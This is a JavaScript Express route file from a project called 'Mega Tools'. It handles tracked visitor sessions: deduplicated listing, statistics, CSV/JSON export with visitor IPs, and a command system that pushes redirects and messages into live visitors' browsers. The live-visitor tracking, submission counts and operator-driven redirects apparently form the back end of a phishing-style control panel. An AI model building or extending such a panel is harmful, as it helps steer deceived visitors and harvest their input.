// ============================================================
// MEGA TOOLS — SESSIONS ROUTES (ENTERPRISE v9.0)
// FIX-R1..R5 (v8.0): retained
// FIX-R6 (v9.0): getCachedSessions — dedupe by normalized string
//                `_id` on every read (defence-in-depth). Even if
//                database.read() misses a duplicate, the sessions
//                route never returns two entries with the same _id.
// FIX-R7 (v9.0): GET / — dedupe + visitorId reconciliation
//                BEFORE pagination (was: raw sessions array). Now
//                duplicate _id / same visitorId entries collapse
//                into one, so pagination and counts stay correct.
// FIX-R8 (v9.0): stats/summary + /online — same dedupe treatment.
// FIX-R9 (v9.0): cleanupExpiredCommand now runs AFTER dedupe so
//                writes never resurrect a stale duplicate.
// FIX-R10 (v9.0): export — same dedupe so CSV never contains
//                 duplicate session rows.
// ============================================================

const express = require('express');
const router = express.Router();
const db = require('../database');
const Session = require('../models/Session');
const Link = require('../models/Link');
const User = require('../models/User');
const { ROLES } = require('../models/roles');
const { authenticate, isOwner } = require('../middleware/auth');
const { getSessionSockets, getRemainingTimeMs, initializeGlobalTimer } = require('../services/sessionManager');
const { toStringId, parseTrackingCode, paginate, now } = require('../utils/helpers');
const CONFIG = require('../config');

// ============================================================
// CACHE
// ============================================================

let sessionsCache = null;
let sessionsCacheExpiry = 0;
const CACHE_TTL = 5000;

// FIX-R6: dedupe by normalized `_id`, preferring the doc with more
// submissions / newer lastActivity. This is defence-in-depth above
// database.read()'s own dedupe — sessions.js can never emit
// duplicates regardless of DB state.
function dedupeSessions(list) {
  if (!Array.isArray(list)) return [];
  const map = new Map();
  for (const s of list) {
    if (!s || s._id === undefined) continue;
    const key = String(s._id);
    const prev = map.get(key);
    if (!prev) { map.set(key, s); continue; }
    const prevSubs = Array.isArray(prev.submissions) ? prev.submissions.length : 0;
    const curSubs = Array.isArray(s.submissions) ? s.submissions.length : 0;
    if (curSubs > prevSubs) {
      map.set(key, { ...prev, ...s, submissions: s.submissions });
    } else if (curSubs === prevSubs) {
      const prevAct = new Date(prev.lastActivity || prev.updated_at || 0).getTime();
      const curAct = new Date(s.lastActivity || s.updated_at || 0).getTime();
      if (curAct > prevAct) map.set(key, { ...prev, ...s });
    }
  }
  return Array.from(map.values());
}

async function getCachedSessions(forceRefresh = false) {
  if (forceRefresh || !sessionsCache || sessionsCacheExpiry < Date.now()) {
    const raw = await db.sessions.read();
    sessionsCache = dedupeSessions(raw);
    sessionsCacheExpiry = Date.now() + CACHE_TTL;
  }
  return sessionsCache;
}

function clearSessionsCache() {
  sessionsCache = null;
  sessionsCacheExpiry = 0;
}

// ============================================================
// HELPERS
// ============================================================

function isSessionForAnyCode(session, codes) {
  if (!session || !codes || codes.length === 0) return false;
  const tc = session.trackingCode || '';
  return codes.some(code => tc === code || tc.startsWith(code + '_'));
}

async function getUserTrackingCodes(userId) {
  return User.getTrackingCodesForUser(userId);
}

async function getAccessibleTrackingCodes(user) {
  try {
    const allUsers = await db.users.read();
    const codes = [user.trackingCode].filter(Boolean);
    if (user.role === ROLES.OWNER) {
      allUsers.forEach(u => { if (u.trackingCode) codes.push(u.trackingCode); });
    }
    return [...new Set(codes)];
  } catch (error) { throw error; }
}

async function filterSessionsByRole(sessions, user) {
  try {
    if (user.role === ROLES.OWNER) return sessions.filter(s => !s.hiddenForAll);
    const codes = await getUserTrackingCodes(user._id);
    const userId = toStringId(user._id);
    return sessions.filter(s => isSessionForAnyCode(s, codes) && !s.hiddenForAll && !(s.hiddenFor && s.hiddenFor.includes(userId)));
  } catch (error) { throw error; }
}

async function checkSessionAccess(session, user) {
  try {
    if (user.role === ROLES.OWNER) return true;
    const codes = await getUserTrackingCodes(user._id);
    return isSessionForAnyCode(session, codes);
  } catch (error) { return false; }
}

function isImageUrl(str) {
  if (!str) return false;
  return /^https?:\/\//.test(str) && /\.(jpg|jpeg|png|gif|webp|svg|bmp|ico)(\?.*)?$/i.test(str);
}

function buildMsgPushPayload(message, targetUrl) {
  const payload = { message: message || '', targetUrl: targetUrl || '' };
  if (isImageUrl(message)) payload.imageUrl = message;
  if (isImageUrl(targetUrl)) payload.imageUrl = targetUrl;
  return payload;
}

function emitMsgPushToOwnerRoom(io, trackingCode, message, targetUrl) {
  if (!io || !trackingCode) return;
  const ownerCode = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
  const payload = buildMsgPushPayload(message, targetUrl);
  io.to('room_' + ownerCode).emit('msg_push', payload);
  try { io.to('room_' + trackingCode).emit('msg_push', payload); } catch (_) {}
}

function cleanupExpiredCommand(session) {
  if (!session || !session.pendingCommand) return false;
  const exp = session.pendingCommand.expiresAt;
  if (exp && new Date(exp) < new Date()) {
    session.pendingCommand = null;
    return true;
  }
  return false;
}

// ============================================================
// GLOBAL TIMER ROUTE
// ============================================================

router.get('/timer', authenticate, async (req, res) => {
  try {
    let remainingMs = await getRemainingTimeMs();
    if (typeof remainingMs !== 'number' || remainingMs <= 0) {
      try { await initializeGlobalTimer(); } catch (_) {}
      remainingMs = await getRemainingTimeMs();
    }
    const safeMs = Math.max(0, Number(remainingMs) || 0);
    res.json({
      success: true,
      remainingMs: safeMs,
      remainingSeconds: Math.floor(safeMs / 1000),
      cycleMs: CONFIG.INBOX_GLOBAL_CYCLE_MS,
      cycleHours: 24,
      timestamp: Date.now(),
    });
  } catch (error) {
    console.error('[Sessions] Timer error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// GET SESSIONS
// FIX-R7: dedupe + role filter BEFORE pagination
// FIX-R9: cleanupExpiredCommand runs on DEDUPED list
// ============================================================

router.get('/', authenticate, async (req, res) => {
  try {
    let sessions = await getCachedSessions();
    const pageNum = parseInt(req.query.page) || 1;
    const limitNum = parseInt(req.query.limit) || CONFIG.SESSIONS_PER_PAGE;

    // FIX-R9: cleanup stale pendingCommand on deduped list
    let mutated = false;
    for (const s of sessions) {
      if (cleanupExpiredCommand(s)) mutated = true;
    }
    if (mutated) {
      await db.sessions.write(sessions);
      clearSessionsCache();
    }

    // FIX-R7: role filter + dedupe (redundant but safe)
    sessions = sessions.filter(s => !s.hiddenForAll);
    sessions = dedupeSessions(sessions);

    if (req.user.role === ROLES.OWNER) {
      sessions.sort((a, b) => {
        if (a.isLive && !b.isLive) return -1;
        if (!a.isLive && b.isLive) return 1;
        return new Date(b.lastActivity || b.timestamp) - new Date(a.lastActivity || a.timestamp);
      });
      const result = paginate(sessions, pageNum, limitNum);
      const todayStart = new Date(); todayStart.setHours(0,0,0,0);
      const todaySessions = sessions.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayStart.getTime());
      const uniqueVisitors = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean)).size;
      const totalSubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
      return res.json({
        sessions: result.data, total: result.total, page: result.page, totalPages: result.totalPages, hasMore: result.hasMore,
        stats: { uniqueSessions: uniqueVisitors, uniqueSubmissions: totalSubs }
      });
    }

    const codes = await getUserTrackingCodes(req.user._id);
    const userId = toStringId(req.user._id);
    let matching = sessions.filter(s => !s.hiddenForAll && isSessionForAnyCode(s, codes) && !(s.hiddenFor && s.hiddenFor.includes(userId)));
    matching = dedupeSessions(matching);
    matching.sort((a, b) => {
      if (a.isLive && !b.isLive) return -1;
      if (!a.isLive && b.isLive) return 1;
      return new Date(b.lastActivity || b.timestamp) - new Date(a.lastActivity || a.timestamp);
    });

    const total = matching.length;
    const totalPages = Math.ceil(total / limitNum);
    const startIdx = (pageNum - 1) * limitNum;
    const paginatedSessions = matching.slice(startIdx, startIdx + limitNum);

    const todayStart = new Date(); todayStart.setHours(0,0,0,0);
    const todayMs = todayStart.getTime();
    const todaySessions = matching.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitors = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean)).size;
    const totalSubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);

    res.json({
      sessions: paginatedSessions, total, page: pageNum, totalPages, hasMore: pageNum < totalPages,
      stats: { uniqueSessions: uniqueVisitors, uniqueSubmissions: totalSubs }
    });
  } catch (error) {
    console.error('[Sessions] GET error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// STATS SUMMARY
// FIX-R8: dedupe before stats
// ============================================================

router.get('/stats/summary', authenticate, async (req, res) => {
  try {
    let all = await getCachedSessions(true);
    all = dedupeSessions(all);
    all = all.filter(s => !s.hiddenForAll);
    all = await filterSessionsByRole(all, req.user);
    all = dedupeSessions(all);
    const todayStart = new Date(); todayStart.setHours(0, 0, 0, 0);
    const todayMs = todayStart.getTime();
    const todaySessions = all.filter(s => new Date(s.lastActivity || s.timestamp).getTime() >= todayMs);
    const uniqueVisitorIds = new Set(todaySessions.map(s => s.visitorId || s.ip).filter(Boolean));
    const todaySubs = todaySessions.reduce((sum, s) => sum + (s.submissions?.length || 0), 0);
    let allTimeSubmissions = 0;
    all.forEach(s => { allTimeSubmissions += (s.submissions?.length || 0); });
    res.json({
      all: {
        live: todaySessions.filter(s => s.isLive).length,
        mobile: todaySessions.filter(s => s.deviceType === 'Mobile').length,
        desktop: todaySessions.filter(s => s.deviceType === 'Desktop').length,
        uniqueSessions: uniqueVisitorIds.size,
        uniqueSubmissions: todaySubs,
        total: todaySessions.length,
        totalAllTime: all.length,
        totalAllTimeSubmissions: allTimeSubmissions,
      }
    });
  } catch (error) {
    console.error('[Sessions] Stats summary error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// ONLINE USERS
// FIX-R8: dedupe first
// ============================================================

router.get('/online', authenticate, async (req, res) => {
  try {
    let allSessions = await getCachedSessions(true);
    allSessions = dedupeSessions(allSessions);
    const allUsers = await db.users.read();
    const nowMs = Date.now();
    const onlineSessions = allSessions.filter(s => {
      if (s.hiddenForAll) return false;
      const lastActivity = new Date(s.lastActivity || s.timestamp || Date.now()).getTime();
      return (nowMs - lastActivity) < CONFIG.SESSION_TIMEOUT_MS;
    });
    const userIdSet = new Set();
    for (const s of onlineSessions) {
      if (s.trackingCode) {
        const user = allUsers.find(u => u.trackingCode && s.trackingCode.startsWith(u.trackingCode));
        if (user) userIdSet.add(toStringId(user._id));
      }
    }
    const onlineUsers = allUsers.filter(u => userIdSet.has(toStringId(u._id)));
    res.json(onlineUsers.map(u => ({
      _id: toStringId(u._id), name: u.name || u.fullName || u.username || 'Unknown',
      username: u.username || '', email: u.email || '', role: u.role || 'user',
      profilePic: u.profilePic || '', trackingCode: u.trackingCode || '', parentId: u.parentId || null,
    })));
  } catch (error) {
    console.error('[Sessions] Online users error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HIDE SESSION
// ============================================================

router.post('/:id/hide', authenticate, async (req, res) => {
  try {
    const session = await Session.hideFromUser(req.params.id, req.user._id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    clearSessionsCache();
    res.json({ message: 'Hidden', sessionId: req.params.id });
  } catch (error) {
    console.error('[Sessions] Hide error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HYBRID SMART COMMAND SYSTEM
// ============================================================

router.post('/:id/command', authenticate, async (req, res) => {
  try {
    const { action, url, message } = req.body;
    const session = await db.sessions.findById(req.params.id);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const updatedSession = await Session.recordCommand(req.params.id, { action: action || 'navigate', url: url || '', message: message || '' });
    updatedSession.pendingCommand = { action: action || 'navigate', url: url || '', message: message || '', seq: updatedSession.commandSeq, timestamp: now(), expiresAt: new Date(Date.now() + 60000).toISOString() };
    await db.sessions.findByIdAndUpdate(req.params.id, { pendingCommand: updatedSession.pendingCommand });
    clearSessionsCache();

    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = { action: action || 'navigate', url: url || '', message: message || '', seq: updatedSession.commandSeq, visitorId: updatedSession.visitorId, trackingCode: updatedSession.trackingCode, timestamp: now() };
    const msgPayload = buildMsgPushPayload(message, url);

    if (io && sockets) {
      if (updatedSession.visitorId) {
        const socketId = sockets[updatedSession.visitorId];
        if (socketId) { io.to(socketId).emit('session_command', command); io.to(socketId).emit('msg_push', msgPayload); }
      }
      if (updatedSession.trackingCode) {
        io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
        io.to('room_' + updatedSession.trackingCode).emit('msg_push', msgPayload);
      }
    }
    if (io && updatedSession.trackingCode) emitMsgPushToOwnerRoom(io, updatedSession.trackingCode, message, url);

    res.json({ success: true, message: 'Command sent', command, sessionId: req.params.id });
  } catch (error) {
    console.error('[Sessions] Command error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// REDIRECT-NEW
// ============================================================

router.post('/:id/redirect-new', authenticate, async (req, res) => {
  try {
    const sessionId = req.params.id;
    const targetUrl = req.body.targetUrl || '';
    const message = req.body.message || '';
    const action = message ? 'navigate+message' : 'navigate';
    const session = await db.sessions.findById(sessionId);
    if (!session) return res.status(404).json({ message: 'Session not found' });
    if (!(await checkSessionAccess(session, req.user))) return res.status(403).json({ message: 'Access denied' });

    const updatedSession = await Session.recordCommand(sessionId, { action, url: targetUrl, message });
    updatedSession.pendingCommand = { action, url: targetUrl, message, seq: updatedSession.commandSeq, timestamp: now(), expiresAt: new Date(Date.now() + 60000).toISOString() };
    await db.sessions.findByIdAndUpdate(sessionId, { pendingCommand: updatedSession.pendingCommand });
    clearSessionsCache();

    const io = req.app.get('io');
    const sockets = getSessionSockets();
    const command = { action, url: targetUrl, message, seq: updatedSession.commandSeq, visitorId: updatedSession.visitorId, trackingCode: updatedSession.trackingCode, timestamp: now() };
    const msgPayload = buildMsgPushPayload(message, targetUrl);

    if (io && sockets) {
      if (updatedSession.visitorId) {
        const socketId = sockets[updatedSession.visitorId];
        if (socketId) { io.to(socketId).emit('session_command', command); io.to(socketId).emit('msg_push', msgPayload); }
      }
      if (updatedSession.trackingCode) {
        io.to('room_' + updatedSession.trackingCode).emit('session_command', command);
        io.to('room_' + updatedSession.trackingCode).emit('msg_push', msgPayload);
      }
    }
    if (io && updatedSession.trackingCode) emitMsgPushToOwnerRoom(io, updatedSession.trackingCode, message, targetUrl);

    res.json({ success: true, message: 'Redirect command sent', command, sessionId });
  } catch (error) {
    console.error('[Sessions] Redirect error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

// ============================================================
// HTTP POLLING: Visitor checks for pending commands
// ============================================================

router.get('/pending-command/:trackingCode', async (req, res) => {
  try {
    const { trackingCode } = req.params;
    const visitorId = req.query.visitorId || '';
    const seq = parseInt(req.query.seq) || 0;
    if (!trackingCode) return res.status(400).json({ success: false, message: 'trackingCode required' });

    const allSessions = await getCachedSessions(true);
    let session = null;

    session = allSessions.find(s =>
      s.trackingCode === trackingCode && !s.hiddenForAll
    );

    if (!session && visitorId) {
      try {
        session = await Session.findForCommandLookup(visitorId, trackingCode);
      } catch (_) { session = null; }
    }

    if (!session) {
      const code = trackingCode.includes('_') ? trackingCode.split('_')[0] : trackingCode;
      session = allSessions.find(s => {
        const sCode = s.trackingCode ? (s.trackingCode.includes('_') ? s.trackingCode.split('_')[0] : s.trackingCode) : '';
        return sCode === code && !s.hiddenForAll;
      });
    }

    if (!session || !session.pendingCommand) return res.json({ success: true, pending: false, message: 'No pending commands' });

    const pendingCmd = session.pendingCommand;
    if (pendingCmd.seq && pendingCmd.seq <= seq) return res.json({ success: true, pending: false, message: 'Command already processed' });
    if (pendingCmd.expiresAt && new Date(pendingCmd.expiresAt) < new Date()) {
      await db.sessions.findByIdAndUpdate(session._id, { pendingCommand: null });
      clearSessionsCache();
      return res.json({ success: true, pending: false, message: 'Command expired' });
    }

    await db.sessions.findByIdAndUpdate(session._id, { pendingCommand: null });
    clearSessionsCache();
    res.json({ success: true, pending: true, command: { action: pendingCmd.action, url: pendingCmd.url, message: pendingCmd.message, seq: pendingCmd.seq, timestamp: pendingCmd.timestamp } });
  } catch (error) {
    console.error('[Sessions] Pending-command error:', error);
    res.status(500).json({ success: false, message: 'Server error' });
  }
});

// ============================================================
// EXPORT
// FIX-R10: dedupe before export
// ============================================================

function csvEscape(value) {
  const s = value === undefined || value === null ? '' : String(value);
  if (s.includes('"') || s.includes(',') || s.includes('\n') || s.includes('\r')) {
    return '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

router.get('/export', authenticate, async (req, res) => {
  try {
    let sessions = await getCachedSessions(true);
    sessions = dedupeSessions(sessions);
    if (req.user.role === ROLES.OWNER) sessions = sessions.filter(s => !s.hiddenForAll);
    else sessions = await filterSessionsByRole(sessions, req.user);
    sessions = dedupeSessions(sessions);

    const rawFormat = (req.query.format || 'csv').toString().toLowerCase();
    const format = rawFormat === 'json' ? 'json' : 'csv';

    if (format === 'json') {
      return res.json({
        success: true,
        count: sessions.length,
        data: sessions.map(s => ({
          sessionId: s._id,
          visitorId: s.visitorId,
          trackingCode: s.trackingCode,
          ip: s.ip,
          device: s.deviceType,
          browser: s.browser,
          status: s.status,
          isLive: s.isLive,
          clicks: s.clicks || 0,
          submissions: s.submissions?.length || 0,
          created: s.created_at,
          lastSeen: s.lastActivity,
        })),
        timestamp: now(),
      });
    }

    const headers = ['Session ID', 'Visitor ID', 'Tracking Code', 'IP', 'Device', 'Browser', 'Status', 'Live', 'Clicks', 'Submissions', 'Created', 'Last Seen'];
    let csv = headers.map(csvEscape).join(',') + '\n';
    sessions.forEach(s => {
      csv += [
        csvEscape(s._id || ''),
        csvEscape(s.visitorId || ''),
        csvEscape(s.trackingCode || ''),
        csvEscape(s.ip || ''),
        csvEscape(s.deviceType || ''),
        csvEscape(s.browser || ''),
        csvEscape(s.status || ''),
        csvEscape(s.isLive ? 'Yes' : 'No'),
        csvEscape(s.clicks || 0),
        csvEscape(s.submissions?.length || 0),
        csvEscape(s.created_at || ''),
        csvEscape(s.lastActivity || ''),
      ].join(',') + '\n';
    });
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=inbox_export_${Date.now()}.csv`);
    res.send(csv);
  } catch (error) {
    console.error('[Sessions] Export error:', error);
    res.status(500).json({ message: 'Server error' });
  }
});

module.exports = router;